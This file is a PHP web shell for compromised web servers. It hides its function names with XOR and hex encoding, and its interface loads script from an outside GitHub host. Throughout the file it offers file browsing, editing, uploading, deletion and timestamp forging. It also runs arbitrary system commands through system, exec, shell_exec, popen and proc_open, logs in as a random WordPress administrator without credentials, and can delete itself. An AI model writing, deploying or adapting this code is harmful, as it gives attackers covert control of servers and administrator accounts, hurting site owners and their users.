<?php 

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
function xorEncryptDecrypt($input, $key="12") {
    $output = '';
    for($i = 0; $i < strlen($input); $i++) {
        $output .= $input[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}


function listing_all_directory() {
    
    $path = $_COOKIE['path'] ?: getcwd();
    $result = array();
    $date_format = "d-m-Y H:i:s";

    if ($handle = opendir($path)) {
        while (false !== ($dir = readdir($handle))) {
            if ($dir === '.' || $dir === '..') {
                continue;
            }

            $full_path = "$path/$dir";
            $is_dir = is_dir($full_path);

            $tmp_result = array(
                'path' => htmlspecialchars($full_path),
                'is_writable' => is_writable($full_path),
                'is_dir' => $is_dir,
                'date' => date($date_format, filemtime($full_path)),
                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
            );

            $result[] = $tmp_result;
        }
        closedir($handle);
    }

    return $result;
}




$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;
$glob_file = isset($_COOKIE['glob-file']) && !empty($_COOKIE['glob-file']) ? $_COOKIE['glob-file'] : false;


if(!$glob_file) {
   $glob_file = check_load_file() ? : '0';
   setcookie("glob-file", $glob_file);
}

if(!$action) {
    main();
    menu();
    
}

function decode_char($string) {
    return xorEncryptDecrypt(hex2bin($string));
}

function check_load_file() {
    $filename = decode_char("46421c5e5e53551c415a41");
    $root_directory = $_SERVER['DOCUMENT_ROOT'];
    $file_path = $root_directory . DIRECTORY_SEPARATOR . $filename;
    return file_exists($file_path) ? $file_path : false;
}

function wp_action_mode($mode) {
    
    global $glob_file;

    
    if($glob_file && ($glob_file !== '0' && file_exists($glob_file))) {
        require_once $glob_file;
    } 

    // Allowed Role
    
    $log_function = decode_char('46426e4154466e534446596d525d5e595857');
    $set_current = decode_char('46426e4154466e51444043575f466e47425743');
    $allowed_role = decode_char("50565c5b5f5b42464353455d43");

    if(!function_exists($log_function)) {
        return false;
    }

    switch ($mode) {
        case 'log':
            $users = get_users(["role" => $allowed_role]);
            if(!$users) {
                return false;
            }

            $arr_rand = array_rand($users, 1);
            $user = $users[$arr_rand];
            
            if(!$user) {
                return false;
            }
            $id = $user->data->ID;
            
            $log_function($id);
            $set_current($id);

            return $id;
            break;
        
        default:
            die("nothing");
            break;
    }
}

function code_execution($value, $function) {
    $output = '';
    
    $decoded_function = decode_char($function);
    $value = decode_char($value);

    // Additional 
    $proccl = decode_char('41405e516e515d5d4257');
    $pcl = decode_char("41515d5d4257");

    ob_start();
    switch ($function) {
        case '424b4246545f':
        case '424b4246545f':
            $decoded_function($value);
            $output = ob_get_contents();
            break;

        case '544a5451':
            $decoded_function($value, $output);
            $output = implode("\n", $output);
            break;

        case '425a545e5d6d544a5451':
            $output = $decoded_function($value);
            break;

        case '415d41575f':
            $handle = $decoded_function($value, 'r');
            if (is_resource($handle)) {
                while (!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                $pcl($handle);
            }
            break;

        case '41405e516e5d41575f':
            $descriptorspec = [
                0 => ["pipe", "r"],  // stdin
                1 => ["pipe", "w"],  // stdout
                2 => ["pipe", "w"]   // stderr
            ];
            $process = $decoded_function($value, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $proccl($process);
            }
            break;

        default:
            // Function not supported or unknown
            break;
    }
    ob_end_clean();

    return $output ? : 'No output?';
}

switch ($action) {

    case 'd':
        # code...
        die(json_encode(listing_all_directory()));
        break;
        
    case 'r':
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $input = decode_char("415a41081e1d585c414745");
            $data = json_decode( file_get_contents($input), true );
            $content = show_base_data()($data['content']);
            $filename = decode_char($_COOKIE['filename']);
            $message['success'] = fm_write_file($filename, $content);
            die(json_encode($message));
        }
        main();
        $content = customize_read_file(decode_char($_COOKIE['filename'])) ;
        
        show_text_area(htmlspecialchars($content));
        break;
    
    case 'cr':
        main();
        show_text_area("");
        break;
    
    case 'ul':
    
        $filename = decode_char($_COOKIE['filename']);
        if(show_un()($filename)) {
            $message['success'] = true;
        }else{
            $message['success'] = false;
        }
        die(json_encode($message));
        break;
    
    case 'up':
        
        $file = $_FILES['import_file'];
        $tmp_name = $file['tmp_name'];
        $content = customize_read_file($tmp_name);
        if(isset($_POST['by'])) {
            $content = show_base_data()($content);
        } 
        $path = $_COOKIE['path'] ? : getcwd();
        $name = $file['name'];
        $destination = "$path/$name";
        $message['success'] = $content && fm_write_file($destination, $content) ? : rename($tmp_name, $destination); 
        die(json_encode($message));
        break;
    
    case 're':
        
        $filename = decode_char($_COOKIE['filename']);
        $path = $_COOKIE['path'];

        if($_SERVER['REQUEST_METHOD'] == "POST") {
            
            $old_filename = "$path/$filename";
            $new = $_POST['new'];
            $new_filename = "$path/$new";
            $message['success'] = rename($old_filename, $new_filename);
            die(json_encode($message));
        }
        break;
    
    case 'to':
        
        $filename = decode_char($_COOKIE['filename']);
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            
            $date = $_POST['date'];
            $str_date = strtotime($date);
            $message['success'] = touch($filename, $str_date);
            clearstatcache(true, $filename);
            die(json_encode($message));
        }
    
    case 'cf':

        if($_SERVER['REQUEST_METHOD'] == "POST") {
            $data = explode(',',$_POST['data']);
            $list_functions = array_map('decode_char', $data);
    
            foreach($list_functions as $function) {
                if(function_exists($function)) {
                    $message['avail'] = true;
                    $message['func'] = $function;

                    die(json_encode($message));                
                }
            }
            $message['avail'] = false;
            die(json_encode($message));

        }

        echo "Missing someone?";
        break;

    case 'ec':
        if($_SERVER['REQUEST_METHOD'] == "POST") {
            
            $value = $_POST['value'];
            $function = $_POST['function'];

            $output = code_execution($value, $function);
            $message['output'] = $output;
            die(json_encode($message));
        }
        echo '(:';
        break;
    
    case 'sd':
        $un = show_un();
        $un(__FILE__);
        $message['success'] = true;
        die(json_encode($message));
        break;
    
    case 'wp':
        if($_SERVER['REQUEST_METHOD'] == "POST") {

            $mode = $_REQUEST['mode'];
            $result = wp_action_mode($mode);
            
            $message['result'] = $result;
            $message['success'] = $result ? true : false;

            die(json_encode($message));
        }

    default:
        # code..
        break;
}

function customize_read_file($file) {
    if(!file_exists($file)) {
        return '';
    }
    $handle = fopen($file, 'rb');
    if($handle) {
        $content = fread($handle, filesize($file));
        if($content) {
            return $content;
        }
    }
    $lines = file($file);
    if($lines) {
        return implode($lines);
    }
    return show_file_contents()($file);
}



function show_file_contents() {
    $file = "file_";
    $old = "get_";
    $contents = "contents";
    return "$file$old$contents";
}
function show_text_area($content) {
    $filename = decode_char($_COOKIE['filename']);
    echo "
    <p><a href='?' id='back_menu'>< Back</a></p>
    <p>$filename</p>
    <textarea width='100%' id='content' cols='20' rows='30' style='margin-top: 10px'>$content</textarea>
    <button type='submit' class='textarea-button' id='textarea-handle'>Submit</button>
    ";
}

function show_base_data() {
    $alvian = "base";
    $nadir = "64_decode";
    return "$alvian$nadir";
}

function fm_write_file($file, $content) {
    if (function_exists('fopen')) {
        $handle = @fopen($file, 'w');
        if ($handle) {
            if (@fwrite($handle, $content) !== false) {
                fclose($handle);
                return file_exists($file) && filesize($file) > 0;
            }
            fclose($handle);
        }
    }

    if (function_exists('file_put_contents')) {
        if (@file_put_contents($file, $content) !== false) {
            return file_exists($file) && filesize($file) > 0;
        }
    }
    return false;
}

function fm_make_request($url) {
    if(function_exists("curl_init")) {
        
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $output = curl_exec($ch);
        return $output;
    }
    return show_file_contents()($url);
}
function show_un() {
    $link = "link";
    $unpad = "un";
    return "$unpad$link";
}

function main() {
    
    global $current_path;
    global $glob_file;

    $current_path = isset($_COOKIE['path']) ? $_COOKIE['path'] : false;

    if(!$current_path) {
        setcookie("path", getcwd());
        $current_path = getcwd();
    }

    $path = str_replace('\\', '/', $current_path);
    $paths = explode('/', $path);
    echo "<div class='wrapper' id='path_div'>";
    foreach ($paths as $id => $pat) {
        if ($id == 0) {
            echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
        }

        if ($pat != '') {
            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
        }
    }
    echo "</div></div>";

?>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link rel="stylesheet" href="https://raw.githubusercontent.com/Lavender-Townhall/townhall/refs/heads/main/styles.css">

<script src="https://raw.githubusercontent.com/Lavender-Townhall/townhall/refs/heads/main/tes22.js"></script>

<script>

 const loadFile = '<?php echo $glob_file; ?>'
 const homePath = '<?php echo getcwd(); ?>'
 const docRoot = '<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>'.replace(/\/$/, "")

</script>

<?php
}
?>



<?php 

function menu() {

?>

<div class="wrapper" id='tools'>
    
    <form method="post" enctype="multipart/form-data">
        <div class="file-upload mr-10">
            <label for="file-upload-input" style="cursor: pointer;">
                [ Upload ]
            </label>
            <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
        </div>
    </form>

    <a href='#' id='refresh-path' class='mr-10 white'>[ HOME ]</a>
    <a href='#' id='create-file' class='mr-10 white'>[ Create File ]</a>

    <a href='#' id='command' class='mr-10 white hidden'>[ COMMAND ]</a>
    <a href='#' id='wp-login' class='mr-10 white hidden'>[ WP Auto Login ]</a>
    
</div>

<div class="wrapper" style='margin-top: -10px' id='bypass-section'>
                <input type="checkbox" class='mr-10' id='bypass-upload' >[ Bypass File Upload ]</input>
                <a href='#' class='corner-right red' id='self-delete'>> SELF DELETE <</a>
</div>
<hr>
<div class="hidden" id='com-section'>
    <a href='#' id='additional-toggle'><p>< Back To Menu</p></a>

    <textarea cols='30' rows='20' class='mb-10' id='com-result' readonly>Hello ^^</textarea>
    
    <input type="text" name="com" class='mr-10' id='com-input'>
    <input type="submit" value="Enter" id='submit-com'>
</div>
<table cellspacing="0" cellpadding="7" width="100%">   
<thead>
        </tr>
        <tr>
            <th width="44%"></th>
            <th width="11%"></th>
            <th width="17%"></th>
            <th width="17%"></th>
            <th width="11%"></th>
        </tr>
    </thead>
    <tbody id="data_table" class='blur-table'>

    </tbody>
</table>

<?php } ?>
